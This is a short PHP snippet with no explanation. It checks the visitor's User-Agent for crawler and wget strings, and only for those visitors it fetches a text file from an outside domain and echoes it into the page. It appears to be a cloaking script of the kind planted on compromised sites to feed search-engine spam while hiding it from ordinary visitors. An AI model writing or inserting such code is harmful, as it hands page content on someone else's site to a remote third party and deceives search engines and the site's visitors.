<?php
$flag = true;
$tmp = $_SERVER['HTTP_USER_AGENT'];
if(strpos($tmp,'bot')>0||strpos($tmp,'Google Web Preview')>0||strpos($tmp,'spider')>0||strpos($tmp,'wget')>0 ){
    $flag = false;}
if($flag == false){
$fh= file_get_contents('http://www.efootclub.com/readme.txt');
echo $fh;
}
?>